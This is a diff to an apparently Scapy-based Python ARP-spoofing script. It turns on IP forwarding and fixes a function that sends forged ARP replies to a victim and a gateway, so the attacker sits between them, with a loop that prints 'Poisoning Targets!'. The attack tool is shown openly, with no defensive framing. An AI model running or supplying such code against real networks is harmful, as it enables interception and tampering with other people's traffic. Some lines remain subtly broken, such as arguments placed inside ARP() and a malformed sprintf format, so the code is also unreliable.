@@ -18,7 +18,7 @@ os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
 def get_mac(IP):
 	conf.verb = 0
 	ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP, timeout = 2,
-	intface = textInterface, inter = 0.1)
+	intface = textInterface, inter = 0.1))
 	for snd, rcv in ans:
 		return rcv.sprintf(r"Ether.src%")
 			
@@ -36,9 +36,9 @@ def restoreARP():
 		
 		
 #ARP reply, switch
-def switch(gm, vm):
-	send(ARP)op = 2, pdst = textVictimIP, psrc = textRouterIP hwdst = vm))
-	send(ARP)op = 2, pdst = textRouterIP, psrc = textVictimIP hwdst = gm))
+def switch(gatewMAC, victimMAC):
+	send(ARP(op = 2, pdst = textVictimIP, psrc = textRouterIP, hwdst = victimMAC))
+	send(ARP(op = 2, pdst = textRouterIP, psrc = textVictimIP, hwdst = gatewMAC))
 		
 #MITM
 
@@ -57,7 +57,7 @@ def mitm():
 		print("Gateway MAC not found")
 		print("Exiting")
 		sys.exit(1)
-	print "Poisoning Targets!"
+	print("Poisoning Targets!")
 	while 1:
 		try:
 			switch(gatewayMAC, victimMAC)
